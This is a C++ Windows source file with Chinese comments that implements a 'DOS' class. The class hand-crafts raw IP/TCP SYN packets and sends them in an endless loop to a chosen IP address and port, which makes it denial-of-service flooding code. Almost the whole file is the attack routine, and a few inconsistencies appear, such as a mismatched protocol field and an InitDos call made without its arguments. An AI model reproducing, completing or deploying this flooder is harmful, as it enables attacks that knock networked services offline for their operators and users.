#include "DDOS.h"

DOS::DOS()
{
	srand(GetTickCount());
	WSADATA WSAData;
	if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0)
	{
		printf("WSAStartup Error!\n");
	}

	if ((m_Socket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0,
		WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET)
	{
		printf("Socket Setup Error!\n");
		DOS::CloseSocket();
	}
	const BOOL flag = TRUE;
	if (setsockopt(m_Socket, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) == SOCKET_ERROR)
	{
		printf("setsockopt IP_HDRINCL error!\n");
		DOS::CloseSocket();
	}
	DWORD nTimeOver = 1000;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver)) == SOCKET_ERROR)
	{
		printf("setsockopt SO_SNDTIMEO error!\n");
		DOS::CloseSocket();
	}

	char buf[256] = "";
	hostent *ph = NULL;
	gethostname(buf, 256);
	std::string hostName = buf;//此处获得本机名称
	ph = gethostbyname(buf);

	int i = 0;
	while (ph->h_addr_list[i] != NULL)
	{
		i++;
	}
	const char *IP = inet_ntoa(*((struct in_addr *)ph->h_addr_list[i - 1]));//此处获得本机IP

	DOS::InitDos();

	//填充IP首部 
	m_IPHeader.h_verlen = (IPVER << 4 | sizeof(m_IPHeader) / sizeof(unsigned long));
	m_IPHeader.tos = (UCHAR)0;
	m_IPHeader.total_len = htons((unsigned short)sizeof(m_IPHeader) + sizeof(m_TCPHeader) + sizeof(m_send_data));
	m_IPHeader.ident = htons(1);//16位标识
	m_IPHeader.frag_and_flags = 0; //3位标志位
	m_IPHeader.ttl = 128; //8位生存时间 
	m_IPHeader.proto = IPPROTO_UDP; //协议类型
	//m_IPHeader.proto = IPPROTO_TCP; //协议类型
	m_IPHeader.checksum = 0; //检验和暂时为0
	SOCKADDR_IN TempAddr;
	memset(&TempAddr, 0, sizeof(TempAddr));
	if (inet_pton(AF_INET, IP, (void*)&TempAddr.sin_addr) < 0)
	{
		DOS::CloseSocket();
	}
	m_IPHeader.sourceIP = TempAddr.sin_addr.s_addr;  //32位源IP地址
	if (inet_pton(AF_INET, m_IP, (void*)&TempAddr.sin_addr) < 0)
	{
		DOS::CloseSocket();
	}
	m_IPHeader.destIP = TempAddr.sin_addr.s_addr;    //32位目的IP地址

	//计算IP头部检验和
	memset(m_check_Buff, 0, MAX_BUFF_LEN);
	memcpy(m_check_Buff, &m_IPHeader, sizeof(IP_HEADER));
	m_IPHeader.checksum = DOS::checksum(m_check_Buff, sizeof(IP_HEADER));

	//构造TCP伪首部
	m_PSDHeader.saddr = m_IPHeader.sourceIP;
	m_PSDHeader.daddr = m_IPHeader.destIP;
	m_PSDHeader.mbz = 0;
	m_PSDHeader.ptcl = m_IPHeader.proto;
	m_PSDHeader.tcpl = htons(sizeof(TCP_HEADER) + sizeof(m_send_data));

	//填充TCP首部 
	m_TCPHeader.th_dport = htons(m_Port); //16位目的端口号
	m_TCPHeader.th_sport = htons(12345); //16位源端口号 
	m_TCPHeader.th_seq = 0;                         //SYN序列号
	m_TCPHeader.th_ack = 0;                         //ACK序列号置为0
	//TCP长度和保留位
	m_TCPHeader.th_lenres = (sizeof(m_TCPHeader) / sizeof(unsigned long) << 4 | 0);
	m_TCPHeader.th_flag = 2; //修改这里来实现不同的标志位探测，2是SYN，1是//FIN，16是ACK探测 等等 
	m_TCPHeader.th_win = htons((unsigned short)16384);     //窗口大小
	m_TCPHeader.th_urp = 0;                            //偏移大小    
	m_TCPHeader.th_sum = 0;                            //检验和暂时填为0

	//计算TCP校验和 
	memset(m_check_Buff, 0, MAX_BUFF_LEN);
	memcpy(m_check_Buff, &m_PSDHeader, sizeof(m_PSDHeader));
	memcpy(m_check_Buff + sizeof(m_PSDHeader), &m_TCPHeader, sizeof(m_TCPHeader));
	memcpy(m_check_Buff + sizeof(PSD_HEADER) + sizeof(TCP_HEADER),
		m_send_data, sizeof(m_send_data));
	m_TCPHeader.th_sum = DOS::checksum(m_check_Buff, sizeof(PSD_HEADER) +
		sizeof(TCP_HEADER) + sizeof(m_send_data));

	//填充发送缓冲区
	memset(m_Sendto_Buffer, 0, MAX_BUFF_LEN);
	memcpy(m_Sendto_Buffer, &m_IPHeader, sizeof(IP_HEADER));
	memcpy(m_Sendto_Buffer + sizeof(IP_HEADER), &m_TCPHeader,
		sizeof(TCP_HEADER));
	//memcpy(m_Sendto_Buff + sizeof(IP_HEADER) + sizeof(TCP_HEADER),
	//	m_send_data, sizeof(m_send_data));
}
DOS::~DOS()
{
	DOS::CloseSocket();
}
void DOS::CloseSocket()
{
	closesocket(m_Socket);
	WSACleanup();
}
//CheckSum:计算校验和的子函数 
USHORT DOS::checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}

	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}

void DOS::CheckSum()
{
	//计算TCP校验和 
	memset(m_check_Buff, 0, MAX_BUFF_LEN);
	memcpy(m_check_Buff, &m_PSDHeader, sizeof(m_PSDHeader));
	memcpy(m_check_Buff + sizeof(m_PSDHeader), &m_TCPHeader, sizeof(m_TCPHeader));
	memcpy(m_check_Buff + sizeof(PSD_HEADER) + sizeof(TCP_HEADER),
		m_send_data, sizeof(m_send_data));
	m_TCPHeader.th_sum = DOS::checksum(m_check_Buff, sizeof(PSD_HEADER) +
		sizeof(TCP_HEADER) + sizeof(m_send_data));

	//填充发送缓冲区
	memset(m_Sendto_Buffer, 0, MAX_BUFF_LEN);
	memcpy(m_Sendto_Buffer, &m_IPHeader, sizeof(IP_HEADER));
	memcpy(m_Sendto_Buffer + sizeof(IP_HEADER), &m_TCPHeader,
		sizeof(TCP_HEADER));
	memcpy(m_Sendto_Buffer + sizeof(IP_HEADER) + sizeof(TCP_HEADER),
		m_send_data, sizeof(m_send_data));
}

BOOL DOS::InitDos(const char *IP, int Port, int Thread)
{
	memcpy_s(m_IP,sizeof(m_IP),IP,strlen(IP));
	m_Port = Port;
	m_Thread = Thread;
	return TRUE;
}
void DOS::Run()
{
	//发送数据报的目的地址
	SOCKADDR_IN DestAddr;
	memset(&DestAddr, 0, sizeof(DestAddr));
	DestAddr.sin_family = AF_INET;
	DestAddr.sin_port = htons(m_Port);
	//DestAddr.sin_addr.s_addr = inet_addr(m_IP);
	if (inet_pton(AF_INET, m_IP, (void*)&DestAddr.sin_addr) < 0)
	{
		DOS::CloseSocket();
	}


	int DataSize = sizeof(IP_HEADER) + sizeof(TCP_HEADER) +
		sizeof(m_send_data);
	while (true)
	{

		DOS::CheckSum();

		int SendLen = sendto(m_Socket, m_Sendto_Buffer, DataSize, 0, (struct sockaddr*)&DestAddr, sizeof(DestAddr));
		if (SendLen == SOCKET_ERROR)
		{
			printf("send error!:%d\n", WSAGetLastError());
			DOS::CloseSocket();
		}
		Sleep(1);
	}
}